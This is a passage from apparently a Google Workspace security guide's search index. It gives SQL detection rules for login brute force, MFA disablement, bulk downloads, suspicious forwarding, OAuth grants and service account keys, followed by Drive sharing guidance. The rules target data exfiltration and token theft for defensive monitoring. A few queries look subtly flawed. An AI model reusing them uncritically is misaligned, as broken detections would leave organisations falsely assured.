COUNT(*) AS failure_count\nFROM login_events\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)\n  AND login_success = false\nGROUP BY user_email, ip_address\nHAVING failure_count &gt;= 10\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - Forgotten password by legitimate user - Application misconfiguration causing repeated login attempts - Password manager issues</p> <p>Validation steps: 1. Check if user reports password issues 2. Review IP address reputation and location 3. Examine login attempt patterns (timing, frequency) 4. Check for successful login following failed attempts</p> <p>Response actions: 1. Temporarily lock account if still under attack 2. Reset user password if account was compromised 3. Block suspicious IP address if clearly malicious 4. Contact user to verify if attempts were legitimate</p>"},{"location":"detection-rules/#mfa-disablement","title":"MFA Disablement","text":"<p>Rule name: GWS-AUTH-003: MFA Disabled for User</p> <p>MITRE ATT&amp;CK: Defense Evasion (T1562), Impair Defenses</p> <p>Data sources: Admin audit logs</p> <p>Detection logic: <pre><code>SELECT \n  admin_email,\n  target_user_email,\n  timestamp,\n  ip_address,\n  user_agent\nFROM admin_events\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND event_type = 'TWO_FACTOR_DISABLE'\n  AND (\n    target_user_email IN (SELECT email FROM privileged_users)\n    OR admin_email != 'scheduled-maintenance@company.com'\n  )\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - Authorized MFA reset due to lost device - Scheduled maintenance activities - Help desk assisting with legitimate MFA issues</p> <p>Validation steps: 1. Verify if change was authorized through proper channels 2. Confirm if admin account was authorized to make change 3. Check for associated help desk ticket 4. Review other activities by the admin account</p> <p>Response actions: 1. Re-enable MFA if unauthorized 2. Reset admin password if admin account was compromised 3. Force password reset for affected user 4. Review admin account activities for other suspicious actions</p>"},{"location":"detection-rules/#off-hours-administrative-actions","title":"Off-Hours Administrative Actions","text":"<p>Rule name: GWS-ADMIN-001: Administrative Actions During Off-Hours</p> <p>MITRE ATT&amp;CK: Privilege Escalation (T1078), Valid Accounts</p> <p>Data sources: Admin audit logs</p> <p>Detection logic: <pre><code>SELECT \n  admin_email,\n  event_type,\n  target_resource,\n  timestamp,\n  ip_address\nFROM admin_events\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND (\n    EXTRACT(HOUR FROM timestamp) &lt; 6\n    OR EXTRACT(HOUR FROM timestamp) &gt; 22\n  )\n  AND EXTRACT(DAYOFWEEK FROM timestamp) BETWEEN 2 AND 6  /* Monday to Friday */\n  AND event_type IN ('USER_PRIVILEGE_CHANGE', 'SECURITY_SETTING_CHANGE', 'PASSWORD_RESET')\n  AND admin_email NOT IN (SELECT email FROM authorized_after_hours_admins)\n</code></pre></p> <p>Severity: Medium</p> <p>False positive scenarios: - Authorized emergency maintenance - Admins in different time zones - Planned after-hours changes - Response to security incidents</p> <p>Validation steps: 1. Verify if change was planned and approved 2. Confirm admin's regular working hours 3. Check for associated change management ticket 4. Review nature of the administrative action</p> <p>Response actions: 1. Contact admin to verify if actions were legitimate 2. Review specific settings changed for security impact 3. Revert unauthorized changes 4. Implement approval workflow for off-hours admin actions</p>"},{"location":"detection-rules/#data-access-exfiltration","title":"Data Access &amp; Exfiltration","text":""},{"location":"detection-rules/#unusual-download-volume","title":"Unusual Download Volume","text":"<p>Rule name: GWS-DATA-001: Unusual Download Volume</p> <p>MITRE ATT&amp;CK: Exfiltration (T1530), Data from Cloud Storage</p> <p>Data sources: Drive audit logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  COUNT(*) AS download_count,\n  SUM(file_size) AS total_download_size_bytes\nFROM drive_activity\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND activity_type = 'DOWNLOAD'\nGROUP BY user_email\nHAVING \n  download_count &gt; 50\n  OR total_download_size_bytes &gt; 500000000  /* 500MB */\n</code></pre></p> <p>Severity: Medium</p> <p>False positive scenarios: - User backing up data for legitimate purposes - Data migration activities - New employee downloading relevant documents - Development activities requiring bulk downloads</p> <p>Validation steps: 1. Check if user is involved in data migration project 2. Verify types of files downloaded 3. Look for business justification for bulk downloads 4. Confirm if user's role typically requires bulk access</p> <p>Response actions: 1. Contact user to verify purpose of downloads 2. Review specific files accessed for sensitivity 3. Examine user's historical download patterns 4. Consider implementing download quotas if unauthorized</p>"},{"location":"detection-rules/#sensitive-data-access","title":"Sensitive Data Access","text":"<p>Rule name: GWS-DATA-002: Sensitive Data Access from Unusual Location</p> <p>MITRE ATT&amp;CK: Exfiltration (T1530), Data from Cloud Storage</p> <p>Data sources: Drive audit logs, DLP classification data</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  file_id,\n  file_name,\n  sensitivity_level,\n  ip_address,\n  country,\n  timestamp\nFROM drive_activity\nJOIN file_sensitivity ON drive_activity.file_id = file_sensitivity.file_id\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND sensitivity_level IN ('CONFIDENTIAL', 'RESTRICTED')\n  AND country NOT IN (SELECT allowed_country FROM approved_access_locations)\n  AND activity_type IN ('VIEW', 'DOWNLOAD', 'COPY')\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - Executive traveling internationally - Approved remote work from non-standard location - Third-party consultant with legitimate access - VPN endpoint causing location misidentification</p> <p>Validation steps: 1. Verify user's travel status 2. Confirm if access was from approved device 3. Check if user has history of accessing these files 4. Review business justification for remote access</p> <p>Response actions: 1. Temporarily revoke access if clearly suspicious 2. Contact user to verify legitimacy of access 3. Review nature and sensitivity of data accessed 4. Implement geographic access restrictions if needed</p>"},{"location":"detection-rules/#unusual-email-forwarding-rules","title":"Unusual Email Forwarding Rules","text":"<p>Rule name: GWS-EMAIL-001: Suspicious Email Forwarding Rule Creation</p> <p>MITRE ATT&amp;CK: Collection (T1114), Email Collection</p> <p>Data sources: Gmail settings logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  rule_id,\n  forwarding_address,\n  creation_time,\n  ip_address\nFROM email_settings_changes\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND change_type = 'CREATE_FORWARDING_RULE'\n  AND (\n    SPLIT(forwarding_address, '@')[OFFSET(1)] NOT IN (SELECT domain FROM approved_email_domains)\n    OR user_email IN (SELECT email FROM executive_users)\n  )\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - Employee forwarding to personal address for legitimate work - Executive assistant setting up approved forwarding - Temporary forwarding during planned absence - Integration with ticketing or workflow systems</p> <p>Validation steps: 1. Verify if forwarding was authorized by user 2. Check if forwarding address is known/trusted 3. Review recent login history for the user 4. Determine if user is aware of the forwarding rule</p> <p>Response actions: 1. Remove unauthorized forwarding rules 2. Reset user password if account compromise suspected 3. Review email logs for potential data exfiltration 4. Implement forwarding restrictions if needed</p>"},{"location":"detection-rules/#administration-configuration","title":"Administration &amp; Configuration","text":""},{"location":"detection-rules/#security-setting-modification","title":"Security Setting Modification","text":"<p>Rule name: GWS-ADMIN-002: Critical Security Setting Changed</p> <p>MITRE ATT&amp;CK: Defense Evasion (T1562), Impair Defenses</p> <p>Data sources: Admin audit logs</p> <p>Detection logic: <pre><code>SELECT \n  admin_email,\n  setting_name,\n  old_value,\n  new_value,\n  timestamp,\n  ip_address\nFROM admin_setting_changes\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND setting_category = 'SECURITY'\n  AND setting_name IN (\n    'REQUIRE_MFA',\n    'EXTERNAL_SHARING_RESTRICTED',\n    'ENFORCE_STRONG_PASSWORD',\n    'OAUTH_APP_ACCESS',\n    'ALLOW_LESS_SECURE_APPS',\n    'LOGIN_CHALLENGES',\n    'DATA_LOSS_PREVENTION'\n  )\n  AND admin_email NOT IN (SELECT email FROM security_administrators)\n</code></pre></p> <p>Severity: Critical</p> <p>False positive scenarios: - Authorized security configuration changes - Temporary adjustments for troubleshooting - Planned security control modifications - New admin learning the environment</p> <p>Validation steps: 1. Verify if change was planned and approved 2. Confirm admin is authorized for security settings 3. Check for associated change management documentation 4. Review the specific security impact of the change</p> <p>Response actions: 1. Revert unauthorized security setting changes 2. Revoke admin access if unauthorized 3. Document all impacted settings and potential exposure 4. Review logs for exploitation during reduced security</p>"},{"location":"detection-rules/#new-administrator-creation","title":"New Administrator Creation","text":"<p>Rule name: GWS-ADMIN-003: New Super Admin Created</p> <p>MITRE ATT&amp;CK: Persistence (T1136), Create Account</p> <p>Data sources: Admin audit logs</p> <p>Detection logic: <pre><code>SELECT \n  admin_email AS assigning_admin,\n  target_user AS new_admin_user,\n  timestamp,\n  ip_address,\n  user_agent\nFROM admin_privilege_changes\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND privilege_name = 'SUPER_ADMIN'\n  AND change_type = 'ASSIGN'\n</code></pre></p> <p>Severity: Critical</p> <p>False positive scenarios: - Legitimate admin succession planning - Approved expansion of admin team - Recovery from admin departure - Temporary admin assignment during project</p> <p>Validation steps: 1. Verify if new admin was approved through proper channels 2. Confirm if assigning admin was authorized to grant Super Admin 3. Check for associated change management documentation 4. Validate new admin's identity and role requirements</p> <p>Response actions: 1. Revoke unauthorized admin privileges 2. Investigate the assigning admin account for compromise 3. Review actions taken by the new admin account 4. Implement admin privilege review process</p>"},{"location":"detection-rules/#oauth-application-authorization","title":"OAuth Application Authorization","text":"<p>Rule name: GWS-APPS-001: Suspicious OAuth Application Authorization</p> <p>MITRE ATT&amp;CK: Persistence (T1098), Account Manipulation</p> <p>Data sources: OAuth token logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  application_name,\n  application_id,\n  scopes,\n  timestamp,\n  ip_address,\n  user_agent\nFROM oauth_token_grants\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND (\n    ARRAY_LENGTH(SPLIT(scopes, ' ')) &gt; 5\n    OR scopes LIKE '%https://www.googleapis.com/auth/gmail%'\n    OR scopes LIKE '%https://www.googleapis.com/auth/drive%'\n  )\n  AND application_id NOT IN (SELECT app_id FROM approved_applications)\n  AND user_email IN (SELECT email FROM privileged_users)\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - New approved application deployment - User testing legitimate application - Authorized third-party integration - Admin testing security controls</p> <p>Validation steps: 1. Review application details and publisher 2. Check if application is widely used in organization 3. Verify if user intended to grant specified permissions 4. Assess the specific permissions (scopes) granted</p> <p>Response actions: 1. Revoke suspicious application access 2. Reset user password if credential theft suspected 3. Block unapproved application at organization level 4. Review logs for data access by the application</p>"},{"location":"detection-rules/#third-party-activity","title":"Third-Party Activity","text":""},{"location":"detection-rules/#api-usage-anomalies","title":"API Usage Anomalies","text":"<p>Rule name: GWS-API-001: Abnormal API Request Volume</p> <p>MITRE ATT&amp;CK: Exfiltration (T1530), Data from Cloud Storage</p> <p>Data sources: API access logs</p> <p>Detection logic: <pre><code>SELECT \n  user_email,\n  api_method,\n  COUNT(*) AS api_call_count,\n  AVG(COUNT(*)) OVER (\n    PARTITION BY user_email, api_method\n    ORDER BY DATE_TRUNC(timestamp, DAY)\n    ROWS BETWEEN 7 PRECEDING AND 1 PRECEDING\n  ) AS daily_average_past_week\nFROM api_access_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\nGROUP BY user_email, api_method, DATE_TRUNC(timestamp, DAY)\nHAVING \n  api_call_count &gt; 5 * IFNULL(daily_average_past_week, 10)\n  AND api_call_count &gt; 100\n</code></pre></p> <p>Severity: Medium</p> <p>False positive scenarios: - New automated system deployment - Bulk operations for legitimate business purposes - Migration or backup activities - System testing or validation</p> <p>Validation steps: 1. Verify if high volume API usage was planned 2. Check specific API methods for sensitivity 3. Determine if user role requires this API access 4. Review historical API usage patterns</p> <p>Response actions: 1. Temporarily restrict API access if clearly abnormal 2. Investigate data accessed through API calls 3. Implement API rate limiting if needed 4. Review service account permissions</p>"},{"location":"detection-rules/#service-account-key-creation","title":"Service Account Key Creation","text":"<p>Rule name: GWS-SVC-001: Service Account Key Created</p> <p>MITRE ATT&amp;CK: Credential Access (T1528), Steal Application Access Token</p> <p>Data sources: Service account audit logs</p> <p>Detection logic: <pre><code>SELECT \n  admin_email,\n  service_account_email,\n  key_id,\n  key_type,\n  timestamp,\n  ip_address\nFROM service_account_key_events\nWHERE \n  timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND event_type = 'CREATE'\n  AND service_account_email LIKE '%@*.gserviceaccount.com'\n  AND admin_email NOT IN (SELECT email FROM authorized_service_account_admins)\n</code></pre></p> <p>Severity: High</p> <p>False positive scenarios: - Authorized key rotation - New service deployment - Development and testing activities - Automation setup by authorized personnel</p> <p>Validation steps: 1. Verify if key creation was authorized 2. Check service account permissions and access 3. Confirm admin is authorized for service account management 4. Review the purpose of the service account</p> <p>Response actions: 1. Disable unauthorized service account keys 2. Review service account activity for suspicious usage 3. Implement approval process for key creation 4. Ensure key rotation policies are in place</p>"},{"location":"detection-rules/#advanced-detection-techniques","title":"Advanced Detection Techniques","text":""},{"location":"detection-rules/#behavioral-analytics","title":"Behavioral Analytics","text":"<p>Implement these more sophisticated detection approaches for mature security programs:</p>"},{"location":"detection-rules/#user-behavioral-baseline-detection","title":"User Behavioral Baseline Detection","text":"<p>Rule name: GWS-UBA-001: User Behavior Anomaly Detection</p> <p>MITRE ATT&amp;CK: Multiple</p> <p>Data sources: Login logs, Drive logs, Gmail logs, API logs</p> <p>Detection approach:</p> <ol> <li>Establish behavioral baselines for each user:</li> <li>Typical working hours</li> <li>Normal device and location patterns</li> <li>Common file access patterns</li> <li>Regular collaboration partners</li> <li>Usual email communication patterns</li> <li> <p>Standard API usage</p> </li> <li> <p>Calculate deviation scores for current activity:</p> </li> <li>Time-of-day anomaly score</li> <li>Location anomaly score</li> <li>Device anomaly score</li> <li>Resource access anomaly score</li> <li>Communication anomaly score</li> <li> <p>Volume anomaly score</p> </li> <li> <p>Generate alerts on significant composite score deviations:    <pre><code>SELECT\n  user_email,\n  activity_date,\n  time_anomaly_score,\n  location_anomaly_score,\n  device_anomaly_score,\n  resource_anomaly_score,\n  communication_anomaly_score,\n  volume_anomaly_score,\n  (time_anomaly_score + location_anomaly_score + device_anomaly_score + \n   resource_anomaly_score + communication_anomaly_score + volume_anomaly_score) AS composite_score\nFROM user_daily_anomaly_scores\nWHERE activity_date = CURRENT_DATE()\nAND composite_score &gt; 15  /* Threshold determined through tuning */\n</code></pre></p> </li> </ol> <p>Severity: High (based on composite score)</p> <p>Implementation considerations: - Requires significant historical data (30+ days minimum) - Machine learning capabilities strongly recommended - Regular retraining to adapt to changing user behaviors - Tuning process to minimize false positives</p>"},{"location":"detection-rules/#peer-group-analytics","title":"Peer Group Analytics","text":"<p>Rule name: GWS-UBA-002: Peer Group Anomaly Detection</p> <p>MITRE ATT&amp;CK: Multiple</p> <p>Data sources: Login logs, Drive logs, Gmail logs, API logs</p> <p>Detection approach:</p> <ol> <li>Define peer groups based on:</li> <li>Department or organizational unit</li> <li>Job role and responsibilities</li> <li>Access patterns and permissions</li> <li> <p>Location and work schedules</p> </li> <li> <p>Establish peer group behavioral norms:</p> </li> <li>Average document access counts</li> <li>Typical external communication patterns</li> <li>Normal sharing behaviors</li> <li> <p>Common application usage</p> </li> <li> <p>Detect individual deviations from peer group:    <pre><code>SELECT\n  user_email,\n  department,\n  user_download_count,\n  AVG(download_count) OVER (PARTITION BY department) AS dept_avg_downloads,\n  STDDEV(download_count) OVER (PARTITION BY department) AS dept_stddev_downloads,\n  (user_download_count - dept_avg_downloads) / NULLIF(dept_stddev_downloads, 0) AS z_score\nFROM user_activity_summary\nWHERE activity_date &gt;= DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nHAVING ABS(z_score) &gt; 3  /* Exceeds 3 standard deviations */\n</code></pre></p> </li> </ol> <p>Severity: Medium (requires investigation)</p> <p>Implementation considerations: - Need accurate and updated organizational structure data - Regular review of peer group definitions - Multiple behavioral dimensions for comprehensive analysis - Adjustment for legitimate role differences within groups</p>"},{"location":"detection-rules/#detection-rule-management","title":"Detection Rule Management","text":""},{"location":"detection-rules/#tuning-and-optimization","title":"Tuning and Optimization","text":"<p>Effective rule tuning requires a structured approach:</p> <ol> <li>Baseline establishment:</li> <li>Monitor alert volumes initially without taking action</li> <li>Identify normal activity patterns that trigger alerts</li> <li> <p>Document legitimate business processes that may appear suspicious</p> </li> <li> <p>Threshold adjustment:</p> </li> <li>Gradually adjust thresholds to reduce false positives</li> <li>Document justification for threshold changes</li> <li> <p>Re-validate detection efficacy after adjustments</p> </li> <li> <p>Exclusion management:</p> </li> <li>Create specific, documented exclusions for known good activities</li> <li>Review exclusions periodically (at least quarterly)</li> <li>Implement sunset dates for temporary exclusions</li> <li> <p>Document business justification for each exclusion</p> </li> <li> <p>Continuous improvement:</p> </li> <li>Schedule regular rule reviews (quarterly recommended)</li> <li>Adjust rules based on changes to organization and threat landscape</li> <li>Document rule performance metrics over time</li> <li>Test rule modifications in staging environment when possible</li> </ol>"},{"location":"detection-rules/#rule-deployment-framework","title":"Rule Deployment Framework","text":"<p>Implement a structured approach to rule deployment:</p> <ol> <li>Development phase:</li> <li>Research threat and create detection hypothesis</li> <li>Document expected behaviors to detect</li> <li>Create initial rule logic</li> <li> <p>Test against historical data if available</p> </li> <li> <p>Testing phase:</p> </li> <li>Deploy in \"alert only\" mode without automated actions</li> <li>Document false positive rate</li> <li>Refine rule logic based on testing results</li> <li> <p>Validate against known good and bad samples</p> </li> <li> <p>Production deployment:</p> </li> <li>Document final rule logic and thresholds</li> <li>Create runbook for alert handling</li> <li>Train security team on investigation procedures</li> <li> <p>Set review date for rule effectiveness</p> </li> <li> <p>Maintenance phase:</p> </li> <li>Track alert metrics (volume, false positive rate, MTTD, MTTR)</li> <li>Schedule periodic reviews of rule effectiveness</li> <li>Update rules to address emerging threats</li> <li>Document rule version history and changes</li> </ol>"},{"location":"detection-rules/#integration-with-security-operations","title":"Integration with Security Operations","text":""},{"location":"detection-rules/#prioritization-framework","title":"Prioritization Framework","text":"<p>Use this framework to prioritize alerts for investigation:</p> <ol> <li>Primary factors:</li> <li>Asset criticality (user account, data sensitivity)</li> <li>Rule confidence level</li> <li>Attack stage (early reconnaissance vs. active exfiltration)</li> <li> <p>Potential business impact</p> </li> <li> <p>Secondary factors:</p> </li> <li>Historical user behavior</li> <li>Correlation with other alerts</li> <li>External threat intelligence</li> <li> <p>Business context (M&amp;A activity, sensitive projects, etc.)</p> </li> <li> <p>Scoring model:    <pre><code>Alert Priority = \n  (Asset Criticality * 0.3) + \n  (Rule Confidence * 0.2) + \n  (Attack Stage * 0.3) + \n  (Business Impact * 0.2)\n</code></pre></p> </li> <li> <p>Priority levels:</p> </li> <li>P1: Critical (SOC response within 15 minutes)</li> <li>P2: High (SOC response within 1 hour)</li> <li>P3: Medium (SOC response within 8 hours)</li> <li>P4: Low (SOC response within 24 hours)</li> </ol>"},{"location":"detection-rules/#automated-response-playbooks","title":"Automated Response Playbooks","text":"<p>These detection rules can trigger automated response actions:</p>"},{"location":"detection-rules/#account-compromise-response","title":"Account Compromise Response","text":"<p>For high-confidence account compromise detections:</p> <ol> <li>Immediate containment:</li> <li>Force password reset</li> <li>Revoke active sessions</li> <li> <p>Enable MFA or increase MFA strength</p> </li> <li> <p>Automated investigation:</p> </li> <li>Collect recent login history</li> <li>Gather OAuth token grants</li> <li>Identify recently accessed sensitive documents</li> <li> <p>Check for email forwarding rules</p> </li> <li> <p>Threat containment:</p> </li> <li>Quarantine suspicious emails</li> <li>Restrict access to sensitive applications</li> <li>Block unusual IP addresses</li> <li>Raise authentication requirements</li> </ol>"},{"location":"detection-rules/#data-exfiltration-response","title":"Data Exfiltration Response","text":"<p>For potential data theft scenarios:</p> <ol> <li>Access control:</li> <li>Revoke suspicious sharing permissions</li> <li>Remove unauthorized forwarding rules</li> <li>Temporarily restrict download capabilities</li> <li> <p>Suspend suspicious OAuth applications</p> </li> <li> <p>Data assessment:</p> </li> <li>Inventory potentially exposed documents</li> <li>Evaluate sensitivity of accessed information</li> <li>Identify recipients of shared content</li> <li> <p>Document timeline of suspicious access</p> </li> <li> <p>Evidence preservation:</p> </li> <li>Capture access logs for investigation</li> <li>Preserve copies of exposed documents</li> <li>Document sharing and access patterns</li> <li>Create timeline of relevant events</li> </ol>"},{"location":"detection-rules/#resources","title":"Resources","text":"<ul> <li>Google Workspace Admin SDK API</li> <li>Google Cloud Logging Documentation</li> <li>MITRE ATT&amp;CK Framework</li> <li>Google Workspace Security Best Practices</li> <li>Google Workspace Investigation Tool</li> </ul> <p>Note: Actual implementation details will vary based on your specific environment, log availability, and security tools. Adapt these detection rules to match your organization's requirements and technical capabilities.</p>"},{"location":"drive-document-security/","title":"Drive & Document Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"drive-document-security/#drive-and-document-security-in-google-workspace","title":"Drive and Document Security in Google Workspace","text":"<p>This guide provides comprehensive strategies for securing Google Drive and documents in Google Workspace environments, with a focus on data protection, sharing controls, and external collaboration security.</p>"},{"location":"drive-document-security/#understanding-google-drive-security-architecture","title":"Understanding Google Drive Security Architecture","text":"<p>Google Drive security encompasses multiple layers of protection:</p> <ul> <li>Access controls: User and group permissions for files and folders</li> <li>Sharing settings: Controls for internal and external sharing</li> <li>Data classification: Identification and protection of sensitive content</li> <li>DLP controls: Prevention of unauthorized data exposure</li> <li>Collaboration management: Secure workflows for document collaboration</li> <li>Retention and governance: Lifecycle management for documents</li> </ul>"},{"location":"drive-document-security/#securing-google-drive-at-the-organizational-level","title":"Securing Google Drive at the Organizational Level","text":""},{"location":"drive-document-security/#core-drive-security-settings","title":"Core Drive Security Settings","text":"<p>Configure these essential settings in the Google Admin Console:</p>"},{"location":"drive-document-security/#sharing-controls","title":"Sharing Controls","text":"<ul> <li>External sharing restrictions: <code>Security &gt; Sharing settings &gt; Sharing options</code></li> <li>Recommended: \"Only allow sharing with trusted domains\" for most organizations</li> <li>High-security: \"Do not allow users to share files outside your organization\"</li> <li> <p>Configure trusted domains based on business partnerships</p> </li> <li> <p>Link sharing defaults: <code>Security &gt; Sharing settings &gt; Link sharing defaults</code></p> </li> <li>Recommended: \"Off by default - only specific people can access\"</li> <li> <p>Consider \"Internal by default - anyone in your organization with the link can access\"</p> </li> <li> <p>File sharing permissions: <code>Security &gt; Sharing settings &gt; File sharing permissions</code></p> </li> <li>Restrict \"Anyone with the link\" options where possible</li> <li>Consider disabling \"Viewers and commenters can see the option to download, print, and copy\"</li> </ul>"},{"location":"drive-document-security/#access-management","title":"Access Management","text":"<ul> <li>Access checks: <code>Security &gt; Access checks</code></li> <li>Enable \"Drive and Docs: Warn when files are shared with external recipients\"</li> <li> <p>Enable \"Drive and Docs: Warn when files are shared outside your organization using a link\"</p> </li> <li> <p>Information rights management: <code>Security &gt; Information rights management</code></p> </li> <li>Enable \"Disable downloading, printing, and copying of files\"</li> <li>Create policies based on document sensitivity</li> </ul>"},{"location":"drive-document-security/#data-loss-prevention","title":"Data Loss Prevention","text":"<ul> <li>DLP rules: <code>Security &gt; Data Loss Prevention</code></li> <li>Create rules to detect sensitive content like PII, financial data, confidential projects</li> <li>Configure automated actions such as:<ul> <li>Warning users when sharing sensitive content</li> <li>Blocking external sharing of sensitive documents</li> <li>Applying classification labels to sensitive content</li> <li>Restricting document copying and downloading</li> </ul> </li> </ul>"},{"location":"drive-document-security/#shared-drive-security","title":"Shared Drive Security","text":"<p>Shared Drives (formerly Team Drives) require specific security controls:</p> <ul> <li>Shared Drive creation controls: <code>Drive and Docs &gt; Shared drive creation</code></li> <li>Consider limiting Shared Drive creation to specific users or groups</li> <li> <p>Implement naming conventions for Shared Drives with enforced prefixes</p> </li> <li> <p>Shared Drive membership settings: <code>Drive and Docs &gt; Shared drive settings</code></p> </li> <li>Configure \"Who can add members to shared drives\"</li> <li>Set appropriate defaults for content manager assignments</li> <li> <p>Consider restricting external member addition to specific user groups</p> </li> <li> <p>Content manager restrictions: <code>Drive and Docs &gt; Shared drive settings</code></p> </li> <li>Configure who can manage members and change settings</li> <li>Limit content manager role to appropriate personnel</li> <li>Consider disabling \"Shared drive members can make content visible to people outside your organization\"</li> </ul>"},{"location":"drive-document-security/#drive-audit-logging-and-monitoring","title":"Drive Audit Logging and Monitoring","text":"<p>Implement comprehensive audit capabilities:</p> <ul> <li>Enable detailed Drive audit logs: <code>Admin console &gt; Reports &gt; Audit &gt; Drive</code></li> <li>Ensure logging for all relevant Drive events</li> <li> <p>Configure log retention appropriate for your compliance requirements</p> </li> <li> <p>Set up alerts for sensitive activities: <code>Admin console &gt; Rules &gt; Create rule</code></p> </li> <li>Alert on bulk download or sharing operations</li> <li>Monitor external sharing of sensitive content</li> <li> <p>Track unusual access patterns to critical documents</p> </li> <li> <p>Export logs to security tools: <code>Admin console &gt; Reports &gt; Audit &gt; Export data</code></p> </li> <li>Configure log export to SIEM systems</li> <li>Implement automated monitoring for security events</li> <li>Create custom dashboards for Drive security metrics</li> </ul>"},{"location":"drive-document-security/#file-level-security-controls","title":"File-Level Security Controls","text":""},{"location":"drive-document-security/#document-classification-framework","title":"Document Classification Framework","text":"<p>Implement a standardized approach to document classification:</p> <ul> <li>Classification levels:</li> <li>Public: Information approved for public release</li> <li>Internal: General business information</li> <li>Confidential: Sensitive information requiring protection</li> <li> <p>Restricted: Highly sensitive information with strict access</p> </li> <li> <p>Classification implementation:</p> </li> <li>Visual labels in document headers/footers</li> <li>Naming conventions incorporating classification</li> <li>Label-based access controls and DLP rules</li> <li> <p>Classification-based sharing restrictions</p> </li> <li> <p>Classification governance:</p> </li> <li>Regular classification reviews</li> <li>Automated scanning for misclassified documents</li> <li>User training on classification requirements</li> <li>Auditing and reporting on classification compliance</li> </ul>"},{"location":"drive-document-security/#document-access-controls","title":"Document Access Controls","text":"<p>Implement granular access management:</p> <ul> <li>Permission levels:</li> <li>Viewer: Can view but not edit or share</li> <li>Commenter: Can comment but not edit content</li> <li>Editor: Can edit and comment</li> <li> <p>Owner: Full control including deletion and permission management</p> </li> <li> <p>Access review procedures:</p> </li> <li>Quarterly reviews of sensitive document access</li> <li>Workflows for access removal when no longer needed</li> <li>Automated notifications for unusual access patterns</li> <li> <p>Regular validation of external collaborator access</p> </li> <li> <p>Time-bound access:</p> </li> <li>Implement access expiration for external collaborators</li> <li>Configure automatic access removal for temporary projects</li> <li>Regular review of long-standing access grants</li> <li>Automated expiration for highly sensitive documents</li> </ul>"},{"location":"drive-document-security/#document-sharing-best-practices","title":"Document Sharing Best Practices","text":"<p>Establish clear guidelines for secure document sharing:</p> <ul> <li>Internal sharing guidelines:</li> <li>Share with specific individuals rather than with \"Anyone in organization\"</li> <li>Use groups for departmental or project-based access</li> <li>Implement \"Need to know\" principle for sensitive information</li> <li> <p>Regular review and cleanup of document sharing</p> </li> <li> <p>External sharing controls:</p> </li> <li>Require explicit approval for external sharing of sensitive documents</li> <li>Configure expiration dates for external access</li> <li>Disable downloading for externally shared sensitive content</li> <li> <p>User account verification for external recipients</p> </li> <li> <p>Secure link sharing:</p> </li> <li>Avoid \"Anyone with the link\" for sensitive information</li> <li>Implement password protection for shared links when available</li> <li>Set appropriate expiration for shared links</li> <li>Regular audit of active shared links</li> </ul>"},{"location":"drive-document-security/#securing-external-collaboration","title":"Securing External Collaboration","text":""},{"location":"drive-document-security/#vendor-and-partner-access-management","title":"Vendor and Partner Access Management","text":"<p>Create a structured approach to external collaboration:</p> <ul> <li>Partner domain verification:</li> <li>Verify partner domains before enabling trusted sharing</li> <li>Document verification process for new partner domains</li> <li>Regular review of trusted domain list</li> <li> <p>Establish security requirements for trusted partners</p> </li> <li> <p>External collaboration workspace:</p> </li> <li>Create dedicated Shared Drives for external collaboration</li> <li>Implement strict access controls for external workspaces</li> <li>Regular review of external workspace membership</li> <li> <p>DLP monitoring focused on external collaboration spaces</p> </li> <li> <p>Access lifecycle management:</p> </li> <li>Document onboarding process for external collaborators</li> <li>Implement offboarding workflows when collaboration ends</li> <li>Regular attestation of continued need for external access</li> <li>Automated deprovisioning based on inactivity or project completion</li> </ul>"},{"location":"drive-document-security/#secure-file-sharing-with-non-google-users","title":"Secure File Sharing with Non-Google Users","text":"<p>Address security considerations for collaboration with users outside Google Workspace:</p> <ul> <li>PIN-protected sharing:</li> <li>Implement PIN requirements for sensitive document access</li> <li>Deliver PINs via separate communication channels</li> <li>Configure PIN expiration and attempt limits</li> <li> <p>Document secure PIN delivery procedures</p> </li> <li> <p>Download protection:</p> </li> <li>Disable download, print, and copy options where possible</li> <li>Implement IRM controls for highly sensitive documents</li> <li>Consider using Google Drive File Stream for partner access</li> <li> <p>Use watermarking for documents that must be downloadable</p> </li> <li> <p>External user verification:</p> </li> <li>Require account verification for external access</li> <li>Implement additional authentication for high-value documents</li> <li>Monitor for suspicious access patterns from external users</li> <li>Regular verification of external user identity</li> </ul>"},{"location":"drive-document-security/#document-security-for-specific-content-types","title":"Document Security for Specific Content Types","text":""},{"location":"drive-document-security/#sensitive-document-types","title":"Sensitive Document Types","text":"<p>Implement specialized controls for high-risk documents:</p> <ul> <li>Financial documents:</li> <li>Restrict access to finance team and executives</li> <li>Implement strict external sharing controls</li> <li>Enable versioning and maintain audit history</li> <li> <p>Consider enhanced encryption for highly 